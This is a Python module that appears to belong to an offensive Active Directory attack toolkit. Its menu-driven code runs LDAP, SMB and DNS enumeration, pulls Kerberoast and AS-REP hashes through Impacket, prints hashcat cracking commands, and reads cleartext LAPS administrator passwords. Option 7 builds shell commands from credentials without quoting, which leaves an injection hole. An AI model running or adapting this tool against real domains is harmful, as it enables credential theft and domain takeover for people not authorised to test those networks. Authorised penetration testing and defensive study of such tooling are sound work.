"""
Module: Enumeration — LDAP/SMB/GPO/DNS/Trust/SPN/LAPS/Delegation
"""
from utils.helpers import *
from config.settings import SESSION, get_auth_string

ENUM_MENU = """
  [1]  LDAP Full Enumeration       (users/groups/computers)
  [2]  SMB Shares & Sessions
  [3]  GPO Enumeration
  [4]  Domain Trust Enumeration
  [5]  Password Policy
  [6]  Kerberoastable Users (SPN)
  [7]  AS-REP Roastable Users
  [8]  AdminCount=1 Privileged Users
  [9]  LAPS Enabled Computers
  [10] Unconstrained Delegation
  [11] Constrained Delegation
  [12] DNS Enumeration
  [13] OUs & Site Topology
  [14] Exchange / RBAC Enumeration
  [A]  Full Auto Enum (all above)
  [0]  Back
"""

def run():
    print_banner("ACTIVE DIRECTORY ENUMERATION")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")

    base_dn = "DC=" + dom.replace(".", ",DC=")
    nxc_a   = nxc_auth(user, pw, SESSION.get("nt_hash", ""), dom, dc)
    cme     = f"nxc smb {shell_quote(dc)} {nxc_a}"
    has_auth = bool(user and (pw or SESSION.get("nt_hash") or SESSION.get("use_kerberos")))
    if SESSION.get("use_kerberos"):
        ldap_b = f"ldapsearch -Y GSSAPI -H ldap://{shell_quote(dc)} -b {shell_quote(base_dn)}"
    elif has_auth:
        ldap_b = (
            f"ldapsearch -x -H ldaps://{shell_quote(dc)}:636 "
            f"-D {shell_quote(user + '@' + dom)} -w {shell_quote(pw)} -b {shell_quote(base_dn)}"
        )
    else:
        ldap_b = (
            f"ldapsearch -x -H ldap://{shell_quote(dc)} "
            f"-b {shell_quote(base_dn)}"
        )
    imp_auth = get_auth_string()
    # imp() available via: from utils.helpers import *

    print(ENUM_MENU)
    c = input(f"  {M}Choice:{RST} ").strip().upper()

    if c in ("1","A"):
        stop = spinner("Enumerating LDAP")
        out = run_cmd(f"{ldap_b} '(objectClass=user)' sAMAccountName memberOf description pwdLastSet userAccountControl", capture=True)
        stop(); save_result(out, "ldap_users.txt", "enum")
        out2 = run_cmd(f"{ldap_b} '(objectClass=group)' cn member", capture=True)
        save_result(out2, "ldap_groups.txt", "enum")
        out3 = run_cmd(f"{ldap_b} '(objectClass=computer)' cn dNSHostName operatingSystem", capture=True)
        save_result(out3, "ldap_computers.txt", "enum")

    if c in ("2","A"):
        run_cmd(f"{cme} --shares")
        run_cmd(f"{cme} --users")
        cme_ldap = f"nxc ldap {shell_quote(dc)} {nxc_a}"
        run_cmd(f"{cme_ldap} --groups")

    if c in ("3","A"):
        out = run_cmd(f"{ldap_b} '(objectClass=groupPolicyContainer)' displayName gPCFileSysPath", capture=True)
        save_result(out, "gpo_enum.txt", "enum")

    if c in ("4","A"):
        run_cmd(f"{ldap_b} '(objectClass=trustedDomain)' trustDirection trustPartner flatName")

    if c in ("5","A"):
        run_cmd(f"{cme} --pass-pol")

    if c in ("6","A"):
        if has_auth:
            stop = spinner("Finding Kerberoastable users")
            run_cmd(f"{imp('GetUserSPNs.py')} {imp_auth} -dc-ip {shell_quote(dc)} -request -outputfile /tmp/kerberoast.txt")
            stop()
            info("Crack: hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt")
        else:
            warn("Skipping Kerberoast SPN collection: credentials are required.")

    if c in ("7","A"):
        run_cmd(f"nxc smb {dc} -u {user} -p {pw} -d {dom} --users | awk '/SMB/{{print $5}}' | grep -v '-' | grep -v '\\*' | tail -n +2 > /tmp/users.txt")
        run_cmd(f"{imp('GetNPUsers.py')} {dom}/ -dc-ip {dc} -no-pass -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/asrep.txt")
        info("Crack: hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt")

    if c in ("8","A"):
        run_cmd(f"{ldap_b} '(&(objectClass=user)(adminCount=1))' sAMAccountName memberOf")

    if c in ("9","A"):
        if has_auth:
            run_cmd(f"{ldap_b} '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime cn")
        else:
            warn("Skipping LAPS query: credentials are required.")

    if c in ("10","A"):
        run_cmd(f"{ldap_b} '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' cn dNSHostName")

    if c in ("11","A"):
        if has_auth:
            run_cmd(f"{imp('findDelegation.py')} {imp_auth} -dc-ip {shell_quote(dc)}")
        else:
            warn("Skipping constrained delegation query: credentials are required.")

    if c in ("12","A"):
        run_cmd(f"dig axfr @{dc} {dom}")
        run_cmd(f"nmap --script dns-srv-enum --script-args dns-srv-enum.domain={dom} {dc}")

    if c in ("13","A"):
        run_cmd(f"{ldap_b} '(objectClass=organizationalUnit)' ou name description")

    if c in ("14","A"):
        run_cmd(f"{ldap_b} '(objectClass=msExchOrganizationContainer)' name")
        run_cmd(f"{cme} -M spider_plus")

    # If full enum completed, automatically trigger Smart Analyst
    if c == "A":
        print(f"\n  {fg(75)}{BOLD}[*] Full Enum complete — launching Smart Analyst...{RST}")
        try:
            import importlib
            analyst = importlib.import_module("modules.analyst")
            importlib.reload(analyst)
            analyst.run()
            return
        except Exception as e:
            warn(f"Analyst error: {e}")

    pause()
